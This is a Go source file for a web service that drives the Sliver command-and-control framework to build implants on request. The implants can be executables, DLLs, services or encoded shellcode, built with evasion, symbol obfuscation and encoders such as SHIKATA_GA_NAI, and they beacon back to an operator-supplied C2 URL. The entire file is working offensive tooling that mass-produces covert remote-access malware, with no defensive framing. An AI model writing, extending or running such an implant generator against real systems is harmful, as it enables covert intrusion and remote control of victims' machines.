package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

type generateRequest struct {
	OS               string `json:"os"`
	Arch             string `json:"arch"`
	Format           string `json:"format"`
	Transport        string `json:"transport"`
	C2URL            string `json:"c2_url"`
	IsBeacon         bool   `json:"is_beacon"`
	Interval         int64  `json:"interval"`
	Jitter           int64  `json:"jitter"`
	Evasion          bool   `json:"evasion"`
	ShellcodeEncoder string `json:"shellcode_encoder"`
	Name             string `json:"name"`
}

func outputFormat(name string, shellcode bool) clientpb.OutputFormat {
	if shellcode {
		return clientpb.OutputFormat_SHELLCODE
	}
	switch strings.ToLower(name) {
	case "shared", "shared_lib", "dll", "so":
		return clientpb.OutputFormat_SHARED_LIB
	case "service":
		return clientpb.OutputFormat_SERVICE
	default:
		return clientpb.OutputFormat_EXECUTABLE
	}
}

func encoder(name string) clientpb.ShellcodeEncoder {
	switch strings.ToUpper(name) {
	case "SHIKATA_GA_NAI":
		return clientpb.ShellcodeEncoder_SHIKATA_GA_NAI
	case "XOR":
		return clientpb.ShellcodeEncoder_XOR
	case "XOR_DYNAMIC":
		return clientpb.ShellcodeEncoder_XOR_DYNAMIC
	default:
		return clientpb.ShellcodeEncoder_NONE
	}
}

const defaultReconnectSeconds = 60

// c2URL ensures the C2 endpoint carries an explicit scheme; Sliver's config
// generation and `models.IsC2Enabled` both key off the URL scheme.
func c2URL(transport, raw string) string {
	if raw == "" || strings.Contains(raw, "://") {
		return raw
	}
	scheme := strings.ToLower(transport)
	switch scheme {
	case "mtls", "http", "https", "tcp", "namedpipe", "dns":
	default:
		scheme = "mtls"
	}
	return scheme + "://" + raw
}

func buildImplantConfig(body generateRequest) *clientpb.ImplantConfig {
	reconnect := body.Interval
	if reconnect <= 0 {
		reconnect = defaultReconnectSeconds
	}
	conf := &clientpb.ImplantConfig{
		GOOS:                body.OS,
		GOARCH:              body.Arch,
		HTTPC2ConfigName:    constants.DefaultC2Profile,
		IsBeacon:            body.IsBeacon,
		BeaconInterval:      body.Interval * int64(time.Second),
		BeaconJitter:        body.Jitter * int64(time.Second),
		Evasion:             body.Evasion,
		ObfuscateSymbols:    true,
		Format:              outputFormat(body.Format, strings.EqualFold(body.Format, "shellcode")),
		IsSharedLib:         strings.EqualFold(body.Format, "shared"),
		IsService:           strings.EqualFold(body.Format, "service"),
		IsShellcode:         strings.EqualFold(body.Format, "shellcode"),
		ShellcodeEncoder:    encoder(body.ShellcodeEncoder),
		ReconnectInterval:   reconnect * int64(time.Second),
		PollTimeout:         3600 * int64(time.Second),
		MaxConnectionErrors: 1000,
		IncludeMTLS:         strings.EqualFold(body.Transport, "mtls"),
		IncludeHTTP:         strings.EqualFold(body.Transport, "http") || strings.EqualFold(body.Transport, "https"),
		IncludeTCP:          strings.EqualFold(body.Transport, "tcp"),
		IncludeNamePipe:     strings.EqualFold(body.Transport, "namedpipe"),
		IncludeDNS:          strings.EqualFold(body.Transport, "dns"),
		NetGoEnabled:        true,
	}
	if url := c2URL(body.Transport, body.C2URL); url != "" {
		conf.C2 = append(conf.C2, &clientpb.ImplantC2{URL: url, Priority: 0})
	}
	return conf
}

func (s *Server) generate(w http.ResponseWriter, r *http.Request) {
	var body generateRequest
	if err := decode(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	if body.OS == "" || body.Arch == "" {
		writeErr(w, http.StatusBadRequest, "os and arch are required")
		return
	}
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	name := body.Name
	if name == "" {
		name = fmt.Sprintf("fleet-%s-%s-%d", body.OS, body.Arch, time.Now().Unix())
	}

	// A previous attempt for the same name may have left a partial vendored
	// tree behind; clear it so "rename import dir: target exists" cannot hit.
	if home, err := os.UserHomeDir(); err == nil {
		srcDir := filepath.Join(home, ".sliver", "slivers", body.OS, body.Arch, name, "src")
		_ = os.RemoveAll(srcDir)
	}

	s.mgr.Begin()
	defer s.mgr.End()

	ctx, cancel := context.WithTimeout(r.Context(), 600*time.Second)
	defer cancel()
	resp, err := client.Generate(ctx, &clientpb.GenerateReq{
		Config: buildImplantConfig(body),
		Name:   name,
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.File == nil {
		writeErr(w, http.StatusBadGateway, "teamserver returned no file")
		return
	}
	// Sliver keeps a full vendored source tree per build under
	// ~/.sliver/slivers/<os>/<arch>/<name>/src. The artifact is already in
	// memory, so reclaim it — otherwise a handful of builds fills a small disk.
	if home, err := os.UserHomeDir(); err == nil {
		srcDir := filepath.Join(home, ".sliver", "slivers", body.OS, body.Arch, name, "src")
		if err := os.RemoveAll(srcDir); err != nil {
			logf("post-build cleanup %s: %v", srcDir, err)
		}
	}

	sum := sha256.Sum256(resp.File.Data)
	writeJSON(w, http.StatusOK, map[string]any{
		"name":     resp.File.Name,
		"build_id": resp.ImplantBuildID,
		"sha256":   hex.EncodeToString(sum[:]),
		"size":     len(resp.File.Data),
		"data_b64": base64.StdEncoding.EncodeToString(resp.File.Data),
	})
}
